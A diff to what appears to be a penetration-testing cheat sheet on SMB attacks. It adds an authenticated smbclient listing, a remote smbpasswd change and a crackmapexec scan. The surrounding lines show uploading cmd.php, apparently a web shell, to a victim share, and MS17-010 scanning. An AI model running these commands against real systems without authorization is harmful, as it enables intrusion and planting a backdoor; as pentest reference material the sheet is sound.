@@ -666,7 +666,13 @@ telnet [victim_ip] [pop3_port]
   - smbclient -N -L \\\\\[victim_ip]
   - smbclient -N -L //[victim_ip]/directory
   - smbclient //[victim_ip]/"[victim_folder]" -m NT1 --option="client min protocol=NT1"
+  - smbclient -L <victim_ip> -U user_name
  ```
+ 
+ ### smb password change
+```
+smbpasswd -r <victim_ip -U <user_name>
+```
 
 ### smbclinet_file_upload
 ```
@@ -689,6 +695,11 @@ smbclient -N //<victim_ip>/<folder> -c 'put cmd.php cmd.php'
 ```
 nmap -v --script vuln [victim_ip] -p 445,139
 nmap -sV -script smb-vuln-ms17-010.nse [victim_ip] -p 139,44
+```
+
+## crackmapexec
+```
+crackmapexec smb <victim_ip>
 ```
 
 ### eternal_blue_metasploit
